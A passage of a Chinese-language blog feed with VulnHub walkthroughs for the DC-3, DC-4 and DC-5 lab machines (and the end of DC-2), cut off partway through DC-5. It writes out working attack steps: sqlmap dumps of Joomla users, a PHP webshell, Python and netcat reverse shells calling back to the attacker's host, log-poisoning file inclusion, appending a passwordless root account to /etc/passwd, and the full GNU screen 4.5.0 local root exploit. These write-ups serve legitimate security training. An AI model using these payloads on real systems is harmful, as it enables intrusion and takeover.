<p>成功提权到root，接下来查看最后一个flag <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@DC-2:/home/jerry<span class="comment"># cat /root/final-flag.txt</span></span><br><span class="line"> __    __     _ _       _                    _ </span><br><span class="line">/ / /\ \ \___| | |   __| | ___  _ __   ___  / \</span><br><span class="line">\ \/  \/ / _ \ | |  / _` |/ _ \| <span class="string">&#x27;_ \ / _ \/  /</span></span><br><span class="line"><span class="string"> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ </span></span><br><span class="line"><span class="string">  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulatons!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A special thanks to all those who sent me tweets</span></span><br><span class="line"><span class="string">and provided me with feedback - it&#x27;</span>s all greatly</span><br><span class="line">appreciated.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>涉及到如下知识点：</p>
<ol type="1">
<li>wpscan的使用；</li>
<li>定制字典；</li>
<li>rbash逃逸；</li>
<li>sudo提权</li>
<li>GTFOBins</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>sudo提权</tag>
        <tag>rbash逃逸</tag>
        <tag>字典定制</tag>
        <tag>GTFOBins</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-3 Writeup</title>
    <url>/2022/05/12/DC-3%20Writeup/</url>
    <content><![CDATA[<p>该靶机比较简单，但在权限提升的时候有一丝繁琐。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/dc-32,312/">DC: 3.2 ~ VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到1个flag</li>
</ul>
<p>难度:</p>
<ul>
<li>低</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.37</span><br><span class="line">sudo nmap -p80, -A 10.0.2.37</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511232726.png" /></p>
<p>从中可以知道，该靶机只开了80端口，并且该端口上的网站的CMS为joomla</p>
<h2 id="外围打点">2.2. 外围打点</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511232829.png" /></p>
<p>根据左边的提示，该靶机只有一个flag，并且没有任何提示。在主页检查一段时间后，没有发现任何有用的点。接下来进行路径扫描。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.37/</span><br></pre></td></tr></table></figure></p>
<p>路径扫描除了一个后台登录界面之外，没有任何其他有用的信息。</p>
<p>接着，我们需要知道joonla的版本信息，然后在进行漏洞利用。利用msfconsole可以得到版本信息。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. search joomla</span><br><span class="line">2. use 13</span><br><span class="line">3. set rhost 10.0.2.37</span><br><span class="line">4. run</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511233138.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511233226.png" /></p>
<p>得知joomla的版本为3.7.0。搜索该版本的漏洞</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511233315.png" /></p>
<p>存在sql注入，注入点在： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">URL Vulnerable: http://10.0.2.37/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</span><br></pre></td></tr></table></figure></p>
<p>sqlnmap利用方式： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://10.0.2.37/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure></p>
<p>输入如下payload探测以下是否真的存在sql注入： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.37/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x7e,database()),0)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511233547.png" /></p>
<p>确实存在，接下来使用sqlmap即可，payload分别为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. sqlmap -u &quot;http://10.0.2.37/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br><span class="line">2. sqlmap -u &quot;http://10.0.2.37/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -p list[fullordering]</span><br><span class="line">3. sqlmap -u &quot;http://10.0.2.37/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]</span><br><span class="line">4. sqlmap -u &quot;http://10.0.2.37/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &quot;#__users&quot; -p list[fullordering]</span><br><span class="line">5. sqlmap -u &quot;http://10.0.2.37/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &quot;#__users&quot; --columns -p list[fullordering]</span><br><span class="line">6. sqlmap -u &quot;http://10.0.2.37/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &quot;#__users&quot; -C &quot;id,username,password,email&quot; --dump  -p list[fullordering]</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511233848.png" /></p>
<p>将密码用john破解，得到 snoopy</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511222646.png" /></p>
<p>到 /administrator/index.php 后台登录。</p>
<h2 id="get-shell">2.3. get shell</h2>
<p>进入后台后，找到模板</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511234054.png" /></p>
<p>将error.php的内容替换为kali中 /usr/share/webshells/php/php-reverse-shell.php，只需要修改ip即可。</p>
<p>接着利用dirsearch扫描，找出修改的error.php的路径。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.37/</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511234310.png" /></p>
<p>因此，真正的路径为/templates/beez3/error.php</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511234409.png" /></p>
<h2 id="权限提升">2.4. 权限提升</h2>
<p>进行信息收集后，我确定该靶机存在内核漏洞，内核版本太低了。因此，将linux-exploit-suggester.sh 传到靶机，并执行</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511234617.png" /></p>
<p>有许多的漏洞，我一个一个执行了下来，直到 CVE-2016-4557。脏牛漏洞会使靶机重启。。。</p>
<p>首先需要将 CVE-2016-4557 的压缩包下载到靶机（使用kali下载再传入，下载需要科学上网）</p>
<p>解压之后，目录内有两个压缩包，crasher.tar和exploit.tar，看名字就知道使用后者。（两者好像是一样的）</p>
<p>将其解压，得到compile.sh和doubleput.c，将后者编译，然后： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. ./compile.sh</span><br><span class="line">2. ./doubleput</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511235014.png" /></p>
<p>接下来就可以读取flag了 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit<span class="comment"># cat /root/the-flag.txt</span></span><br><span class="line">cat /root/the-flag.txt</span><br><span class="line"> __        __   _ _   ____                   _ _ _ _ </span><br><span class="line"> \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |</span><br><span class="line">  \ \ /\ / / _ \ | | | | | |/ _ \| <span class="string">&#x27;_ \ / _ \ | | | |</span></span><br><span class="line"><span class="string">   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|</span></span><br><span class="line"><span class="string">    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)</span></span><br><span class="line"><span class="string">                                                     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations are in order.  :-)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I hope you&#x27;</span>ve enjoyed this challenge as I enjoyed making it.</span><br><span class="line"></span><br><span class="line">If there are any ways that I can improve these little challenges,</span><br><span class="line">please <span class="built_in">let</span> me know.</span><br><span class="line"></span><br><span class="line">As per usual, comments and complaints can be sent via Twitter to @DCAU7</span><br><span class="line"></span><br><span class="line">Have a great day!!!!</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>该靶机难度不高，就是在权限提升处比较繁琐。涉及到如下知识点：</p>
<ol type="1">
<li>后台get shell</li>
<li>SQL注入</li>
<li>内核漏洞</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>SQL注入</tag>
        <tag>内核漏洞</tag>
        <tag>后台利用</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-4 Writeup</title>
    <url>/2022/05/12/DC-4%20Writeup/</url>
    <content><![CDATA[<p>该靶机比较简单。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/dc-4,313/">DC: 4 ~ VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到1个flag</li>
</ul>
<p>难度：</p>
<ul>
<li>低 # 2. 渗透 ## 2.1. 主机发现、端口扫描、端口服务发现 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.38</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.38</span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220512090405.png" /></p>
<h2 id="信息收集">2.2. 信息收集</h2>
<p>直接访问80端口，发现只有一个登录界面，源码和数据包没有有用的信息。路径扫描也没有任何有用的结果。因此，只能从登录界面做打算。</p>
<p>我首先尝试了sql注入，但是失败了。又去搜索是否存在可以利用的漏洞，也失败了。是在没办法那就直接爆破。好在爆破成功了，字典选择的是 burp pro 自带的</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220512111117.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220512103650.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220512103703.png" /></p>
<p>从 happy 之后的数据包都是636，只有 happy 的是 660，查看对应数据包，确实是 happy 的时候就登录成功了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin:happy</span><br></pre></td></tr></table></figure>
<h2 id="get-shell">2.3. get shell</h2>
<p>登录进去看到一个功能点：command，并且选择 List Files 然后 run，结果如下</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220512111331.png" /></p>
<p>好像能够直接执行系统命令，经过多次测试，确实如此。因此直接执行反弹shell的命令 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>成功登录。</p>
<h2 id="权限提升">2.4. 权限提升</h2>
<p>首先查看 /etc/passwd 发现存在除root之外的3个用户： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">charles</span><br><span class="line">jim</span><br><span class="line">sam</span><br></pre></td></tr></table></figure></p>
<h3 id="jim">2.4.1. jim</h3>
<p>首先查看jim的家目录，有三个文件比较可疑</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220512111556.png" /></p>
<p>查看 test.sh 发现只是一个脚本，循环输出字符。如果这里有suid权限就可以直接提权了，太可惜了。</p>
<p>然后查看 backups，该目录下有一个备份文件 old-passwords.bak，里面存放的许多字符串，猜测可能存在 jim 的密码，因此使用hydra爆破： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l jim -P old-passwords.txt 10.0.2.38 ssh</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220512105836.png" /></p>
<p>得到jim的密码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jim:jibril04</span><br></pre></td></tr></table></figure> ### 2.4.2. charles ssh连接上去（shell更好用），然后查看 mbox <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">From root@dc-4 Sat Apr 06 20:20:04 2019</span><br><span class="line">Return-path: &lt;root@dc-4&gt;</span><br><span class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Received: from root by dc-4 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-4&gt;)</span><br><span class="line">        id 1hCiQe-0000gc-EC</span><br><span class="line">        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Test</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=&quot;UTF-8&quot;</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;</span><br><span class="line">From: root &lt;root@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Status: RO</span><br><span class="line"></span><br><span class="line">This is a test.</span><br></pre></td></tr></table></figure></p>
<p>这看过去象是一封邮件的内容，而Linux存在一个邮箱的目录 /var/mail，因此查看该目录下的情况。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220512111957.png" /></p>
<p>该目录下有两个文件，其中www-data没有有用的信息，而从jim中得到charles的用户名和密码，直接切换用户即可 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">From charles@dc-4 Sat Apr 06 21:15:46 2019</span><br><span class="line">Return-path: &lt;charles@dc-4&gt;</span><br><span class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000</span><br><span class="line">Received: from charles by dc-4 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;charles@dc-4&gt;)</span><br><span class="line">        id 1hCjIX-0000kO-Qt</span><br><span class="line">        for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Holidays</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=&quot;UTF-8&quot;</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;</span><br><span class="line">From: Charles &lt;charles@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 21:15:45 +1000</span><br><span class="line">Status: O</span><br><span class="line"></span><br><span class="line">Hi Jim,</span><br><span class="line"></span><br><span class="line">I&#x27;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</span><br><span class="line"></span><br><span class="line">Password is:  ^xHhA&amp;hvim0y</span><br><span class="line"></span><br><span class="line">See ya,</span><br><span class="line">Charles</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220512112146.png" /></p>
<h3 id="root">2.4.3. root</h3>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220512112211.png" /></p>
<p>而Linux中有一个命令 tee，看这个名字好像就是 tee。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">strings /usr/bin/tee</span><br><span class="line">strings /usr/bin/teehee</span><br></pre></td></tr></table></figure></p>
<p>发现两者内容一致，因此先当作tee进行提权。<strong>tee命令的作用主要是可以将字符以标准输入的方式写入文件</strong>。</p>
<p>现在 teehee 是root权限，也就是我们可以利用该命令向一些只允许root写入的文件写入内容，最直接想到的就是 /etc/passwd <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;m1ku1::0:0:::/bin/bash&quot;</span> | sudo /usr/bin/teehee -a /etc/passwd <span class="comment"># -a 表示在原来内容上追加新的内容</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220512112749.png" /></p>
<p>直接切换到 m1ku</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220512112815.png" /></p>
<p>最后，读取/root/flag.txt内容 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">888       888          888 888      8888888b.                             888 888 888 888 </span><br><span class="line">888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 </span><br><span class="line">888  d8b  888          888 888      888    888                            888 888 888 888 </span><br><span class="line">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span><br><span class="line">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 </span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>该靶机难度不大，涉及到如下知识点：</p>
<ol type="1">
<li>密码爆破</li>
<li>命令执行</li>
<li>反弹shell</li>
<li>sudo配置不当提权</li>
<li>/etc/passwd 作用</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>sudo提权</tag>
        <tag>密码爆破</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-5 Writeup</title>
    <url>/2022/05/13/DC-5%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度适中。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/dc-5,314/">DC: 5 ~ VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到1个flag</li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.40</span><br><span class="line">sudo nmap -p80,111,36098 -A 10.0.2.40</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513100013.png" /></p>
<h2 id="信息收集">2.2. 信息收集</h2>
<p>访问80端口</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513104020.png" /></p>
<p>把所有的功能页面都测试一遍，发现在contact那有提交点，并且提交完成之后会得到新的文件 thankyou.php</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513104212.png" /></p>
<p>起初还以为存在SQL注入，后来测试没有，就放过这里了，然后去路径扫描，也没有任何结果。其实当多次刷新页面的时候，下面的 Copyright@2018 会发生变化（靶机地址也提示了，多次刷新才能够发现漏洞）</p>
<p>而这个信息是通过包含footer.php文件显示的，因此猜测这里可能存在文件包含，但是我们还不知道参数，可以通过爆破，不过我先尝试了以下file，结果就过了</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513104653.png" /></p>
<p>因为没有ssh服务，所以只能通过文件包含来获得shell。</p>
<h2 id="get-shell">2.3. get shell</h2>
<p><strong>思路：利用文件包含一个含有php利用代码的文件</strong>。</p>
<p>靶机上不可能存在这样的一个文件，所以我们需要手动写入。文件包含漏洞是无法写入文件的，因此只能够通过某种功能，使系统自动写文件，也就是日志。其中，通过端口服务发现直到80端口的服务为http，且cms为nginx，通过搜索知道默认日志存储文件路径为：/var/log/nginx/，先访问了/var/log/nginx/access.log，发现没有信息。又访问了 /var/log/nginx/error.log 出现了信息。</p>
<p>通过查看源码，发现好像error.log会记录访问的url的信息</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513105101.png" /></p>
<p>因此构造如下payload</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513105149.png" /></p>
<p>然后输入如下url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.40/thankyou.php?file=/var/log/nginx/error.log&amp;ant=id</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513105325.png" /></p>
<p>成功写入。（如果直接查看日志，而不加命令，有可能不显示php的代码，因为被执行了所以不显示，如果显示了，说明php代码没被执行！）</p>
<p>输入如下反弹shell的payload：（先确定有没有nc） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.40/thankyou.php?file=/var/log/nginx/error.log&amp;ant=nc -e /bin/bash 10.0.2.4 3333</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513105659.png" /></p>
<h2 id="权限提升">2.4. 权限提升</h2>
<p>当查找suid文件的时候，发现了一个可疑的文件 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513105837.png" /></p>
<p>不知道这文件的作用，就去搜索了一下有没有利用漏洞</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513105946.png" /></p>
<p>直接把sh文件传到靶机执行，发现报错了，报错信息如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~ gnu/screenroot ~</span><br><span class="line">[+] First, we create our shell and library...</span><br><span class="line">gcc: error trying to exec &#x27;cc1&#x27;: execvp: No such file or directory</span><br><span class="line">gcc: error trying to exec &#x27;cc1&#x27;: execvp: No such file or directory</span><br><span class="line">[+] Now we create our /etc/ld.so.preload file...</span><br><span class="line">[+] Triggering...</span><br><span class="line">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span><br><span class="line">ERROR: ld.so: object &#x27;/tmp/libhax.so&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span><br><span class="line">No Sockets found in /tmp/screens/S-www-data.</span><br><span class="line"></span><br><span class="line">./41154.sh: line 42: /tmp/rootshell: No such file or directory</span><br></pre></td></tr></table></figure></p>
<p>分析报错信息：gcc需要调用cc1（gcc分两个步骤：预处理和编译。其中预处理为cpp完成，而编译由cc1完成）。而靶机上没有cc1。</p>
<p>查看 sh 文件的内容，可以发现该文件会创建两个c文件，并进行编译，最后才提权。</p>
<p>解决办法也很简单：在kali上将两个c文件编译好，然后传到靶机</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 41154.sh 文件内容：</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> screenroot.sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> setuid screen v4.5.0 <span class="built_in">local</span> root exploit</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> HACK THE PLANET</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ~ infodox (25/1/2017)</span></span><br><span class="line">echo &quot;~ gnu/screenroot ~&quot;</span><br><span class="line">echo &quot;[+] First, we create our shell and library...&quot;</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so...</span><br></pre></td></tr></table></figure>
<p>创建下面两个文件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// libhax.c 文件内容：</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dropshell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
